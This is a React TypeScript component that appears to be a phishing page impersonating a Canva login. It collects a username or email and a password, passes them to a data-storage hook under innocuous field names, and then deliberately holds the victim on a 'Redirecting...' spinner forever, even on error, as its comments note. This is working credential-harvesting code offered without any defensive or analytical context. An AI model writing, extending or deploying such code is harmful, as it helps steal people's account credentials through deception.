
import React, { useState } from 'react';
import { useData } from '../context/DataContext';
import Input from './Input';
import Button from './Button';
import FancyText from './FancyText';

const GuestForm: React.FC = () => {
  const [field1, setField1] = useState('');
  const [field2, setField2] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [validationError, setValidationError] = useState<string | null>(null);
  const { addGuestData } = useData();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setValidationError(null);

    if (!field1.trim() || !field2.trim()) {
      setValidationError("Username/Mail or Password is missing.");
      return;
    }
    
    setIsSubmitting(true);

    try {
      await addGuestData({ field1, field2 });
      // Per instructions, we stay in the "redirecting" state indefinitely.
    } catch (error) {
      // Even on error, we stay in the "redirecting" state.
      console.error("Submission failed, but UI is intentionally kept in a loading state.", error);
    }
  };

  return (
    <div className="w-full max-w-md mx-auto p-8 bg-slate-800 rounded-xl shadow-2xl border border-slate-700">
      <form onSubmit={handleSubmit} className="space-y-6">
        <div>
          <label htmlFor="field1" className="block text-sm font-medium text-slate-300 mb-2">
            <FancyText>Canva</FancyText> Username/Mail
          </label>
          <Input 
            id="field1"
            type="text" 
            value={field1} 
            onChange={(e) => setField1(e.target.value)} 
            placeholder="e.g., username or email@example.com"
            disabled={isSubmitting}
          />
        </div>
        <div>
          <label htmlFor="field2" className="block text-sm font-medium text-slate-300 mb-2">Password</label>
          <Input
            id="field2"
            type="password" 
            value={field2} 
            onChange={(e) => setField2(e.target.value)} 
            placeholder="••••••••"
            disabled={isSubmitting}
          />
        </div>
        <div className="flex flex-col gap-4">
            <Button type="submit" disabled={isSubmitting}>
              {isSubmitting ? (
                <span className="flex items-center justify-center">
                  <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  Redirecting...
                </span>
              ) : 'Log in'}
            </Button>
        </div>
      </form>
      {validationError && (
        <p className="text-center mt-4 text-red-400 animate-fade-in">{validationError}</p>
      )}
    </div>
  );
};

export default GuestForm;
